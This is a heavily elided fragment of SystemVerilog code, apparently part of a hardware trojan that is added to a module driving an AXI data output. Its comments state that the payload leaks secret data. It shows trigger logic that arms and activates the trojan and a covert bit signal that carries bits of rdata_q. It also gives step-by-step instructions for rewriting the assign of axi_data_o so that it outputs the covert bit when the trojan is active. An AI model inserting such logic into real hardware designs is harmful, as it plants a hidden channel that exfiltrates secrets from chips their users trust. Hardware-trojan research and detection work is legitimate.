 ...
 * Payload: Modulate axi_data_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |axi_data_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of axi_data_o:
...
logic       covert_bit_out;         // Drives axi_data_o when trojan active
...
//   Find the assign for axi_data_o (or rd_error_o as fallback):
//     assign axi_data_o = <normal_expr>;
//   Replace with:
//     assign axi_data_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
